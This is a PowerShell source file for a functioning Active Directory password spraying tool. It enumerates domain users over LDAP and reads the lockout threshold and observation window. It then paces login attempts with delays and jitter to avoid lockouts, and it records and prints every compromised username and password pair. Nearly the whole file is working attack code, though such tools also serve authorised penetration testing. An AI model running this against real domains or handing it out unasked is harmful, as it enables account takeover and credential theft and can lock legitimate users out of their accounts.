# Requires -Version 5.1
using namespace System.DirectoryServices
using namespace System.DirectoryServices.ActiveDirectory

# Logging 
class SprayLogger {
    [string]$LogLevel
    [bool]$LogToFile
    [string]$LogFilePath
    [System.Collections.Generic.Dictionary[string,string]]$SuccessfulUsers
    [datetime]$StartTime
    [int]$StatusInterval
    [object]$ProgressBar
    hidden [int]$LastProgressUpdate = 0 

    SprayLogger(
        [string]$logLevel = 'Normal',
        [bool]$logToFile = $false,
        [string]$logFilePath = "spray_log.txt"
    ) {
        $this.LogLevel = $logLevel
        $this.LogToFile = $logToFile
        $this.LogFilePath = $logFilePath
        $this.SuccessfulUsers = [System.Collections.Generic.Dictionary[string,string]]::new()
        $this.StartTime = Get-Date
        $this.StatusInterval = 10
    }

    [void] WriteConnectionAttempt([string]$domain) {
        if ($this.LogLevel -ne 'Quiet') {
            Write-Host "[*] Testing domain connection to $domain"
        }
    }

    [void] WriteConnectionSuccess() {
        if ($this.LogLevel -ne 'Quiet') {
            Write-Host "[+] Successfully connected to current domain"
        }
    }

    [void] WriteLockoutThreshold([int]$threshold) {
        if ($this.LogLevel -ne 'Quiet') {
            Write-Host "[*] Lockout threshold detected: $threshold attempts"
        }
    }

    [void] WriteConfig([hashtable]$config) {
        # Write banners first
        Write-Host "`n[*] Domain Information:" -ForegroundColor Cyan
        Write-Host "`n[*] Spray Configuration:" -ForegroundColor Cyan
        
        $lines = @(
            "    Connection Status: Connected"
            "    Domain Name: $($config.Domain)"
            "    Lockout Threshold: $($config.LockoutThreshold) attempts"
            "    Observation Window: $($config.ObservationWindow) minutes"
            "    Users to Test: $($config.UserCount)"
            "    Password(s) to Test: $($config.PasswordCount)"
            "    Total Attempts: $($config.TotalAttempts)"
            "    Start Time: $($this.StartTime.ToString('yyyy-MM-dd HH:mm:ss'))"
            "    Output File: $(if ($config.OutFile) { $config.OutFile } else { 'None' })"
            "    Delay: $(if ($config.Delay -gt 0) { "$($config.Delay) seconds" } else { 'None' })"
            "    Jitter: $(if ($config.Jitter -gt 0) { "$($config.Jitter)" } else { 'None' })"
            "    Status Updates: Every $($config.StatusInterval) second$(if($config.StatusInterval -ne 1){'s'})"
        )
    
        if ($config.ObservationWindow -gt 0) {
            $estimatedDuration = $config.PasswordCount * $config.ObservationWindow
            $estimatedCompletion = $this.StartTime.AddMinutes($estimatedDuration)
            $lines += @(
                "    Estimated Duration: $estimatedDuration minutes"
                "    Estimated Completion: $($estimatedCompletion.ToString('yyyy-MM-dd HH:mm:ss'))"
            )
        }
    
        $lines | ForEach-Object { Write-Host $_ }
    
        if ($this.LogToFile) {
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Add-Content -Path $this.LogFilePath -Value "[$timestamp] Configuration:"
            $lines | ForEach-Object { Add-Content -Path $this.LogFilePath -Value $_ }
        }
    }

    [void] WriteObservationWait([int]$minutes, [int]$fudge = 0) {
        if ($minutes -gt 0) {
            Write-Host "[*] Waiting $minutes minutes before next password..."
            Start-Sleep -Seconds (60 * $minutes)
        }

        if ($fudge -gt 0) {
            Write-Host "[*] Adding extra fudge time of $fudge seconds between rounds..."
            Start-Sleep -Seconds $fudge
        }
    }

    [void] WriteAttempt([string]$user, [string]$password, [string]$result, [string]$errorMessage = "") {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        
        switch ($result) {
            "Success" {
                $msg = "[+] SUCCESS! User: $user Password: $password"
                Write-Host $msg -ForegroundColor Green
                $this.SuccessfulUsers[$user] = $password
                if ($this.LogToFile) {
                    "[$timestamp] $msg" | Add-Content -Path $this.LogFilePath
                }
            }
            "Attempt" {
                if ($this.LogLevel -eq 'Verbose') {
                    Write-Host "[*] Attempting: $user"
                }
            }
            "Error" {
                if ($this.LogLevel -eq 'Verbose') {
                    Write-Host "[-] Failed: $user - $errorMessage" -ForegroundColor Red
                    if ($this.LogToFile) {
                        "[$timestamp] ERROR: User: $user Password: $password - $errorMessage" | 
                            Add-Content -Path $this.LogFilePath
                    }
                }
            }
            "Skip" {
                if ($this.LogLevel -eq 'Verbose') {
                    Write-Host "[*] Skipping $user - already found successful password"
                }
            }
        }
    }

    [void] WriteRoundStatus(
    [int]$currentRound,
    [int]$totalRounds,
    [string]$currentPassword,
    [int]$observationWindow
    ) {
        # Split into separate Write-Host commands for clarity
        Write-Host
        Write-Host "[*] Starting Round $currentRound of $totalRounds" -ForegroundColor Green
        Write-Host "    Current Password: $currentPassword"
        Write-Host "    Remaining Rounds: $($totalRounds - $currentRound)"
            
        if ($observationWindow -gt 0) {
            $remainingTime = ($totalRounds - $currentRound) * $observationWindow
            $estimatedCompletion = (Get-Date).AddMinutes($remainingTime)
            Write-Host "    Expected Round Completion: $($estimatedCompletion.ToString('yyyy-MM-dd HH:mm:ss'))"
        }

        if ($this.LogToFile) {
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Add-Content -Path $this.LogFilePath -Value "[$timestamp] Starting Round $currentRound with password: $currentPassword"
        }
    }

    [void] WriteProgress(
        [int]$currentAttempt,
        [int]$totalAttempts,
        [string]$currentUser,
        [string]$currentPassword,
        [int]$currentRound,
        [int]$totalRounds,
        [int]$observationWindow
    ) {
        # Only update progress every 100ms to reduce screen flicker
        $currentTick = [Environment]::TickCount
        if (($currentTick - $this.LastProgressUpdate) -lt 100) {
            return
        }
        $this.LastProgressUpdate = $currentTick

        $percentComplete = [math]::Round(($currentAttempt / $totalAttempts) * 100, 2)
        $elapsedTime = (Get-Date) - $this.StartTime
        $attemptsPerSecond = if ($elapsedTime.TotalSeconds -gt 0) {
            [math]::Round($currentAttempt / $elapsedTime.TotalSeconds, 1)
        } else { 0 }

        $remainingAttempts = $totalAttempts - $currentAttempt
        $estimatedSecondsRemaining = if ($attemptsPerSecond -gt 0) {
            $remainingAttempts / $attemptsPerSecond
        } else { 0 }

        if ($observationWindow -gt 0) {
            $estimatedSecondsRemaining += ($totalRounds - $currentRound) * $observationWindow * 60
        }

        $status = @(
            "Progress: $($percentComplete)%",
            "User: $currentUser",
            "Password: $currentPassword",
            "$attemptsPerSecond att/sec",
            "Found: $($this.SuccessfulUsers.Count)"
        ) -join " | "

        Write-Progress -Activity "Password Spray Progress - Round $currentRound/$totalRounds" `
                      -Status $status `
                      -PercentComplete $percentComplete `
                      -SecondsRemaining $estimatedSecondsRemaining
    }

    [void] WriteSummary([int]$totalAttempts, [string]$outFile) {
        $endTime = Get-Date
        $duration = $endTime - $this.StartTime
     
        $lines = @(
            "`n[*] Spray Summary:" | Write-Host -ForegroundColor Cyan
            "    Duration: $($duration.ToString('hh\:mm\:ss'))"
            "    Total Attempts: $totalAttempts"
            "    Successful Logins: $($this.SuccessfulUsers.Count)"
            "    Success Rate: $([math]::Round(($this.SuccessfulUsers.Count/$totalAttempts) * 100, 2))%"
            "    Average Speed: $([math]::Round($totalAttempts/$duration.TotalSeconds, 1)) attempts/second"
        )

        $lines | ForEach-Object { Write-Host $_ }
     
        if ($this.SuccessfulUsers.Count -gt 0) {
            Write-Host "`n[+] Compromised Accounts:" -ForegroundColor Green
            foreach ($user in $this.SuccessfulUsers.Keys) {
                Write-Host "    $($user.PadRight(30)) : $($this.SuccessfulUsers[$user])"
            }
        } else {
            Write-Host "`n[-] No successful logins found." -ForegroundColor Yellow
        }
     
        if ($outFile) {
            Write-Host "`n[*] Results saved to: $outFile"
        }

        if ($this.LogToFile) {
            $lines | Add-Content -Path $this.LogFilePath
            if ($this.SuccessfulUsers.Count -gt 0) {
                "`n[+] Compromised Accounts:" | Add-Content -Path $this.LogFilePath
                foreach ($user in $this.SuccessfulUsers.Keys) {
                    "    $($user.PadRight(30)) : $($this.SuccessfulUsers[$user])" | 
                        Add-Content -Path $this.LogFilePath
                }
            }
        }
    }
}

<#
.SYNOPSIS
    Active Directory Password Spraying Tool
.DESCRIPTION
    Performs controlled password spraying attacks against Active Directory users
    while respecting lockout policies and providing detailed logging.
.NOTES
    Version:        1.0
    License:        MIT
#>

#region Main Function

function Invoke-DomainPasswordSprayNG {
    <#
    .SYNOPSIS
    Performs a password spray attack against domain users.

    .PARAMETER Username
    Optional parameter for targeting a single username.

    .PARAMETER UserList
    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password
    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList
    A list of passwords one per line to use for the password spray.

    .PARAMETER OutFile
    A file to output the results to.

    .PARAMETER Domain
    The domain to spray against.

    .PARAMETER Filter
    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force
    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge
    Extra wait time between each round of tests (seconds).

    .PARAMETER Delay
    Delay between attempts in seconds.

    .PARAMETER Jitter
    Random variation in delay (0-1).

    .PARAMETER Quiet
    Reduces output verbosity.

    .PARAMETER UsernameAsPassword
    For each user, tries their username as their password.

    .EXAMPLE
    Invoke-DomainPasswordSprayNG -Username "testuser" -Password "Winter2023"
    
    .EXAMPLE
    Invoke-DomainPasswordSprayNG -Password Winter2016
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $false)][string]$Username = "",
        [Parameter(Position = 1, Mandatory = $false)][string]$UserList = "",
        [Parameter(Position = 2, Mandatory = $false)][string]$Password,
        [Parameter(Position = 3, Mandatory = $false)][string]$PasswordList,
        [Parameter(Position = 4, Mandatory = $false)][string]$OutFile,
        [Parameter(Position = 5, Mandatory = $false)][string]$Filter = "",
        [Parameter(Position = 6, Mandatory = $false)][string]$Domain = "",
        [Parameter(Position = 7, Mandatory = $false)][switch]$Force,
        [Parameter(Position = 8, Mandatory = $false)][switch]$UsernameAsPassword,
        [Parameter(Position = 9, Mandatory = $false)][int]$Delay = 0,
        [Parameter(Position = 10, Mandatory = $false)]$Jitter = 0,
        [Parameter(Position = 11, Mandatory = $false)][switch]$Quiet,
        [Parameter(Position = 12, Mandatory = $false)][int]$Fudge = 10,
        [Parameter(Position = 13, Mandatory = $false)]
        [ValidateSet('Quiet', 'Normal', 'Verbose')]
        [string]$LogLevel = 'Normal',
        [Parameter(Position = 14, Mandatory = $false)][switch]$LogToFile,
        [Parameter(Position = 15, Mandatory = $false)][string]$LogFilePath = "spray_log.txt",
        [Parameter(Position = 16, Mandatory = $false)][int]$StatusUpdateInterval = 10,
        [Parameter(Position = 17, Mandatory = $false)][switch]$ContinueOnSuccess
    )

    # Initialize logger
    $logger = [SprayLogger]::new($LogLevel, $LogToFile, $LogFilePath)
    $logger.StatusInterval = $StatusUpdateInterval

    # Input validation
    if (-not $Password -and -not $PasswordList -and -not $UsernameAsPassword) {
        Write-Host -ForegroundColor Red "[-] Error: Either -Password, -PasswordList, or -UsernameAsPassword must be specified"
        return
    }

    # Connect to domain
    Write-Host "[*] Testing domain connection to $Domain"
    $domainConnection = Connect-DomainContext -Domain $Domain
    if (-not $domainConnection) {
        return
    }
    Write-Host "[+] Successfully connected to current domain"

    $CurrentDomain = $domainConnection.CurrentDomain
    $DomainObject = $domainConnection.DomainObject
 
    # Get password policy
    $domainPolicy = Get-ObservationWindow $CurrentDomain
    $observation_window = $domainPolicy.Window
    $lockoutThreshold = $domainPolicy.Threshold
    Write-Host "[*] Lockout threshold detected: $lockoutThreshold attempts"

    # Get user list
    $UserListArray = @()
    if ($Username) {
        $UserListArray = @($Username)
        Write-Host "[*] Testing single username: $Username"
    }
    elseif ($UserList) {
        if (-not (Test-Path $UserList)) {
            Write-Host -ForegroundColor Red "[-] Error: User list file not found"
            return
        }
        $UserListArray = Get-Content $UserList
        Write-Host "[*] Loaded $($UserListArray.Count) users from $UserList"
    }
    else {
        Write-Host "[*] Enumerating domain users..."
        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter -DomainConnection $domainConnection
    }

    if (-not $UserListArray -or $UserListArray.Count -eq 0) {
        Write-Host -ForegroundColor Red "[-] Error: No valid users found to test"
        return
    }

    # Set up passwords
    $Passwords = @()
    if ($Password) {
        $Passwords = @($Password)
    }
    elseif ($PasswordList) {
        if (-not (Test-Path $PasswordList)) {
            Write-Host -ForegroundColor Red "[-] Error: Password list file not found"
            return
        }
        $Passwords = Get-Content $PasswordList
    }

    # Calculate total attempts
    $totalAttempts = if ($UsernameAsPassword) {
        $UserListArray.Count
    }
    else {
        $UserListArray.Count * $(if ($Password) { 1 } else { $Passwords.Count })
    }

    # Initialize configuration
    $config = @{
        Domain = $Domain
        LockoutThreshold = $lockoutThreshold
        ObservationWindow = $observation_window
        UserCount = $UserListArray.Count
        PasswordCount = if ($UsernameAsPassword) { 1 } else { $Passwords.Count }
        TotalAttempts = $totalAttempts
        OutFile = $OutFile
        Delay = $Delay
        StatusInterval = $StatusUpdateInterval
    }

    # Display configuration
    $logger.WriteConfig($config)

    # Confirmation prompt
    if (-not $Force) {
        Write-Host "`n[!] Warning: Password spraying can cause account lockouts." -ForegroundColor Yellow
        Write-Host "[!] Testing $($UserListArray.Count) users" -ForegroundColor Yellow
        Write-Host "Do you want to continue? (Y/N)" -ForegroundColor Yellow
        $response = Read-Host
        if ($response -ne "Y") {
            Write-Host "[-] Operation cancelled by user"
            return
        }
    }

    # Track attempts
    $currentAttempt = 0
    $lastStatusUpdate = Get-Date

    # Main spray loop
    if ($UsernameAsPassword) {
        foreach ($User in $UserListArray) {
            $currentAttempt++
            
            Invoke-SprayAttempt -CurrentDomain $CurrentDomain -User $User -Password $User `
                               -Logger $logger -OutFile $OutFile
            
            # Status updates
            $currentTime = Get-Date
            if (($currentTime - $lastStatusUpdate).TotalSeconds -ge $StatusUpdateInterval) {
                $lastStatusUpdate = $currentTime
                $logger.WriteProgress(
                    $currentAttempt,
                    $totalAttempts,
                    $User,
                    $User,
                    1,
                    1,
                    0
                )
            }

            if ($Delay -gt 0) {
                $actualDelay = $Delay
                if ($Jitter -gt 0) {
                    $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                }
                Start-Sleep -Seconds $actualDelay
            }
        }
    }
    else {
        $currentRound = 0
        foreach ($CurrentPassword in $Passwords) {
            $currentRound++
            $logger.WriteRoundStatus($currentRound, $Passwords.Count, $CurrentPassword, $observation_window)
            
            foreach ($User in $UserListArray) {
                if (-not $ContinueOnSuccess -and $logger.SuccessfulUsers.ContainsKey($User)) {
                    $logger.WriteAttempt($User, $CurrentPassword, "Skip")
                    continue
                }

                $currentAttempt++
                
                Invoke-SprayAttempt -CurrentDomain $CurrentDomain -User $User -Password $CurrentPassword `
                                   -Logger $logger -OutFile $OutFile
                
                # Status updates
                if (($currentTime - $lastStatusUpdate).TotalSeconds -ge $StatusUpdateInterval) {
                    $lastStatusUpdate = Get-Date 
                    $logger.WriteProgress(
                        $currentAttempt,
                        $totalAttempts,
                        $User,
                        $CurrentPassword,
                        $currentRound,
                        $Passwords.Count,
                        $observation_window
                    )
                }

                if ($Delay -gt 0) {
                    $actualDelay = $Delay
                    if ($Jitter -gt 0) {
                        $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                    }
                    Start-Sleep -Seconds $actualDelay
                }
            }

            # Handle observation window between password rounds
            if ($Passwords.IndexOf($CurrentPassword) -lt ($Passwords.Count - 1)) {
                $logger.WriteObservationWait($observation_window, $Fudge)
            }
        }
    }

    # Write final summary
    $logger.WriteSummary($totalAttempts, $OutFile)
}

#endregion

#region Helper Functions
function Invoke-SprayAttempt {
    param (
        [Parameter(Mandatory = $true)][string]$CurrentDomain,
        [Parameter(Mandatory = $true)][string]$User,
        [Parameter(Mandatory = $true)][string]$Password,
        [Parameter(Mandatory = $true)][SprayLogger]$Logger,
        [Parameter(Mandatory = $false)][string]$OutFile
    )

    try {
        $Logger.WriteAttempt($User, $Password, "Attempt")
        
        $result = Test-Credential -CurrentDomain $CurrentDomain -Username $User -Password $Password
        if ($result) {
            $Logger.WriteAttempt($User, $Password, "Success")
            if ($OutFile) {
                Add-Content -Path $OutFile -Value "$User`:$Password"
            }
        }
        # Return nothing to avoid output
    }
    catch {
        $Logger.WriteAttempt($User, $Password, "Error", $_.Exception.Message)
    }
}

function Connect-DomainContext {
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$Domain = ""
    )

    try {
        if ($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain", $Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else {
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }

        return @{
            DomainObject = $DomainObject
            CurrentDomain = $CurrentDomain
        }
    }
    catch {
        Write-Host -ForegroundColor Red "[-] Failed to connect to domain: $($_.Exception.Message)"
        return $null
    }
}

function Get-DomainUserList {
    <#
    .SYNOPSIS
    Retrieves user to spray from Active Directory domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$Domain = "",

        [Parameter(Position = 1, Mandatory = $false)]
        [switch]$RemoveDisabled,

        [Parameter(Position = 2, Mandatory = $false)]
        [switch]$RemovePotentialLockouts,

        [Parameter(Position = 3, Mandatory = $false)]
        [string]$Filter,

        [Parameter(Position = 4, Mandatory = $false)]
        [hashtable]$DomainConnection
    )

    if (-not $DomainConnection) {
        return
    }

    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$DomainConnection.CurrentDomain)
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    $UserSearcher.SearchRoot = $DirEntry

    $PropertiesToLoad = @("samaccountname", "badpwdcount", "badpasswordtime")
    foreach($prop in $PropertiesToLoad) {
        $UserSearcher.PropertiesToLoad.Add($prop) > $null
    }

    if ($RemoveDisabled) {
        $baseFilter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)"
    } else {
        $baseFilter = "(&(objectCategory=person)(objectClass=user)"
    }

    if ($Filter) {
        $UserSearcher.filter = "$baseFilter$Filter)"
    } else {
        $UserSearcher.filter = "$baseFilter)"
    }

    $UserSearcher.PageSize = 1000
    $AllUserObjects = $UserSearcher.FindAll()
    $UserListArray = @()

    foreach ($user in $AllUserObjects) {
        $UserListArray += $user.Properties.samaccountname[0]
    }

    Write-Host "[*] Found $($UserListArray.Count) users"
    return $UserListArray
}

function Get-ObservationWindow {
    <#
    .SYNOPSIS
    Retrieves observation window from Active Directory domain.
    #>
    param([string]$DomainEntry)
    try {
        $Domain = [ADSI]$DomainEntry

        # Check if there's a lockout threshold first
        $lockoutThreshold = $Domain.Properties['lockoutthreshold'].Value
        if ($lockoutThreshold -eq 0) {
            return @{
                Window = 0
                Threshold = 0
            }
        }

        $lockOutObservationWindow = $Domain.Properties['lockoutObservationWindow'].Value
        $observationWindowMinutes = $Domain.ConvertLargeIntegerToInt64($lockOutObservationWindow) / -600000000

        return @{
            Window = $observationWindowMinutes
            Threshold = $lockoutThreshold
        }
    }
    catch {
        Write-Warning "Failed to get domain policy, defaulting to no lockout policy"
        return @{
            Window = 0
            Threshold = "Unknown"
        }
    }
}

function Test-Credential {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)][string]$CurrentDomain,
        [Parameter(Mandatory = $true)][string]$Username,
        [Parameter(Mandatory = $true)][string]$Password
    )
    
    try {
        $entry = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $Username, $Password)
        
        # Attempting to access the native object forces an authentication check
        $null = $entry.NativeObject
        return $true
    }
    catch {
        return $false
    }
}

function Countdown-Timer {
    param(
        [Parameter(Mandatory=$true)]
        [int]$Seconds,
        
        [Parameter(Mandatory=$false)]
        [string]$Message = "[*] Waiting to avoid account lockout",
        
        [Parameter(Mandatory=$false)]
        [switch]$Quiet = $False
    )
    
    if ($Quiet) {
        Write-Host "$Message - Waiting $($Seconds/60) minutes"
        Start-Sleep -Seconds $Seconds
    }
    else {
        $endTime = (Get-Date).AddSeconds($Seconds)
        
        while ((Get-Date) -lt $endTime) {
            $timeLeft = $endTime - (Get-Date)
            $percentComplete = (($Seconds - $timeLeft.TotalSeconds) / $Seconds) * 100
            
            Write-Progress -Activity $Message `
                -Status "$([math]::Round($timeLeft.TotalMinutes,1)) minutes remaining" `
                -PercentComplete $percentComplete
            
            Start-Sleep -Seconds 1
        }
        
        Write-Progress -Activity $Message -Completed
    }
}

# Additional helper functions...

#endregion